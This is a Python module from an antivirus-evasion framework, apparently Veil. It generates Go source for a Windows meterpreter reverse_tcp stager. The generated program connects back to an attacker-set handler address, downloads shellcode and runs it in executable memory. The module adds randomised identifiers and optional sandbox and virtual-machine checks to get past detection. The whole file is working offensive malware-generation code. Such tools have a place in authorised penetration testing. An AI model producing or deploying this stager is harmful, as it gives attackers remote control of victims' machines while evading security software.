"""

Custom-written pure go meterpreter/reverse_tcp stager.


Module built by @b00stfr3ak44
Updated by @ChrisTruncer

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "go"
        self.extension = "go"
        self.rating = "Normal"
        self.name = "Pure Golang Reverse TCP Stager"
        self.path = "go/meterpreter/rev_tcp"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
            "LHOST"          : ["", "IP of the Metasploit handler"],
            "LPORT"          : ["80", "Port of the Metasploit handler"],
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "UTCCHECK"       : ["FALSE", "Check if system uses UTC time"],
            "USERPROMPT"     : ["FALSE", "Prompt user prior to injection"],
            "RAMCHECK"       : ["FALSE", "Check for at least 3 gigs of RAM"],
            "PROCCHECK"      : ["FALSE", "Check for active VM processes"],
            "MINPROCS"       : ["X", "Minimum number of running processes"],
            "BADMACS"        : ["FALSE", "Check for VM based MAC addresses"],
            "CLICKTRACK"     : ["X", "Require X number of clicks before execution"],
            "CURSORCHECK"    : ["FALSE", "Check for mouse movements"],
            "DISKSIZE"       : ["X", "Check for a minimum number of gigs for hard disk"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):
        memCommit = evasion_helpers.randomString()
        memReserve = evasion_helpers.randomString()
        pageExecRW = evasion_helpers.randomString()
        kernel32 = evasion_helpers.randomString()
        procVirtualAlloc = evasion_helpers.randomString()
        size = evasion_helpers.randomString()
        err = evasion_helpers.randomString()
        wsadata = evasion_helpers.randomString()
        socket = evasion_helpers.randomString()
        socketAddr = evasion_helpers.randomString()
        ip = self.required_options["LHOST"][0].split('.')
        buf = evasion_helpers.randomString()
        dataBuf = evasion_helpers.randomString()
        flags = evasion_helpers.randomString()
        qty = evasion_helpers.randomString()
        scLength = evasion_helpers.randomString()
        sc = evasion_helpers.randomString()
        sc2 = evasion_helpers.randomString()
        total = evasion_helpers.randomString()
        mem = evasion_helpers.randomString()
        buffer_variable = evasion_helpers.randomString()
        handle = evasion_helpers.randomString()
        x = evasion_helpers.randomString()
        value = evasion_helpers.randomString()
        cust_func = evasion_helpers.randomString()
        heapcreatevariable = evasion_helpers.randomString()
        heapallocvariable = evasion_helpers.randomString()
        heapcreateout = evasion_helpers.randomString()
        allocvarout = evasion_helpers.randomString()
        errorvariable = evasion_helpers.randomString()
        errorvariabledos = evasion_helpers.randomString()
        constSize = evasion_helpers.randomString()

        # sandbox check code
        sandbox_checks, num_curlys = gamemaker.senecas_games(self)

        payload_code = "package main\nimport (\n\"encoding/binary\"\n\"syscall\"\n\"unsafe\"\n"
        if self.required_options["PROCESSORS"][0].lower() != "x":
            payload_code += "\"runtime\"\n"

        # Add in other imports based on checks being performed
        if self.required_options["USERNAME"][0].lower() != "x":
            payload_code += "\"strings\"\n\"os/user\"\n"
        if self.required_options["HOSTNAME"][0].lower() != "x" or self.required_options["PROCCHECK"][0].lower() != 'false':
            if "strings" not in payload_code:
                payload_code += "\"strings\"\n"
        if self.required_options["SLEEP"][0].lower() != "x":
            payload_code += "\"net\"\n\"time\"\n\"encoding/binary\"\n"
        if self.required_options["BADMACS"][0].lower() != 'false':
            if "net" not in payload_code:
                payload_code += "\"net\"\n"
            if "strings" not in payload_code:
                payload_code += "\"strings\"\n"
        if self.required_options["UTCCHECK"][0].lower() != 'false':
            if "time" not in payload_code:
                payload_code += "\"time\"\n"
        if self.required_options["CURSORCHECK"][0].lower() != 'false':
            if "time" not in payload_code:
                payload_code += "\"time\"\n"

        payload_code += ")\n"

        payload_code += "const (\n"
        payload_code += "%s  = 0x1000\n" % (memCommit)
        payload_code += "%s = 0x2000\n" % (memReserve)
        payload_code += "%s  = 0x40\n)\n" % (pageExecRW)

        payload_code += "var (\n"

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s = syscall.NewLazyDLL(\"kernel32.dll\")\n" % (kernel32)
            payload_code += "%s = %s.NewProc(\"VirtualAlloc\")\n)\n" % (procVirtualAlloc, kernel32)
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" % (cust_func, size)
            payload_code += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" % (allocvarout, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" % (allocvarout, err, allocvarout)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += kernel32 + " = syscall.NewLazyDLL(\"kernel32.dll\")\n"
            payload_code += heapcreatevariable + " = " + kernel32 + ".NewProc(\"HeapCreate\")\n"
            payload_code += heapallocvariable + " = " + kernel32 + ".NewProc(\"HeapAlloc\")\n)\n"
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" % (cust_func, size)
            payload_code += heapcreateout + ", _, " + errorvariable + " := " + heapcreatevariable + ".Call(0x00040000, " + size + ", 0)\n"
            payload_code += allocvarout + ", _, " + errorvariabledos + " := " + heapallocvariable + ".Call(" + heapcreateout + ", 0x00000008, " + size + ")\n"
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" % (allocvarout, err, allocvarout)

        payload_code += "func main() {\n"
        # Sandbox code goes here
        if sandbox_checks != '':
            payload_code += sandbox_checks
        payload_code += "const %s = 1000 << 10\n" %(constSize)
        payload_code += "var %s syscall.WSAData\n" %(wsadata)
        payload_code += "syscall.WSAStartup(uint32(0x202), &%s)\n" %(wsadata)
        payload_code += "%s, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n" %(socket)
        payload_code += "%s := syscall.SockaddrInet4{Port: %s, Addr: [4]byte{%s, %s, %s, %s}}\n" %(socketAddr, self.required_options["LPORT"][0], ip[0], ip[1], ip[2], ip[3])
        payload_code += "syscall.Connect(%s, &%s)\n" %(socket, socketAddr)
        payload_code += "var %s [4]byte\n" %(buf)
        payload_code += "%s := syscall.WSABuf{Len: uint32(4), Buf: &%s[0]}\n" %(dataBuf, buf)
        payload_code += "%s := uint32(0)\n" %(flags)
        payload_code += "%s := uint32(0)\n" %(qty)
        payload_code += "syscall.WSARecv(%s, &%s, 1, &%s, &%s, nil, nil)\n" %(socket, dataBuf, qty, flags)
        payload_code += "%s := binary.LittleEndian.Uint32(%s[:])\n" %(scLength, buf)
        payload_code += "%s := make([]byte, %s)\n" %(sc, scLength)
        payload_code += "var %s []byte\n" %(sc2)
        payload_code += "%s = syscall.WSABuf{Len: %s, Buf: &%s[0]}\n" %(dataBuf, scLength, sc)
        payload_code += "%s = uint32(0)\n" %(flags)
        payload_code += "%s = uint32(0)\n" %(qty)
        payload_code += "%s := uint32(0)\n" %(total)
        payload_code += "for %s < %s {\n" %(total, scLength)
        payload_code += "syscall.WSARecv(%s, &%s, 1, &%s, &%s, nil, nil)\n" %(socket, dataBuf, qty, flags)
        payload_code += "for i := 0; i < int(%s); i++ {\n" %(qty)
        payload_code += "%s = append(%s, %s[i])\n}\n%s += %s\n}\n" %(sc2, sc2, sc, total, qty)
        payload_code += "%s, _ := %s(uintptr(%s + 5))\n" %(mem, cust_func, scLength)
        payload_code += "%s := (*[%s]byte)(unsafe.Pointer(%s))\n" %(buffer_variable,constSize, mem)
        payload_code += "%s := (uintptr)(unsafe.Pointer(%s))\n" %(handle, socket)
        payload_code += "%s[0] = 0xBF\n" %(buffer_variable)
        payload_code += "%s[1] = byte(%s)\n" %(buffer_variable, handle)
        payload_code += "%s[2] = 0x00\n" %(buffer_variable)
        payload_code += "%s[3] = 0x00\n" %(buffer_variable)
        payload_code += "%s[4] = 0x00\n" %(buffer_variable)
        payload_code += "for %s, %s := range %s {\n" %(x, value, sc2)
        payload_code += "%s[%s+5] = %s\n}\n" %(buffer_variable, x, value)
        payload_code += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" %(mem)
        payload_code += '}' * num_curlys

        self.payload_source_code = payload_code
        return
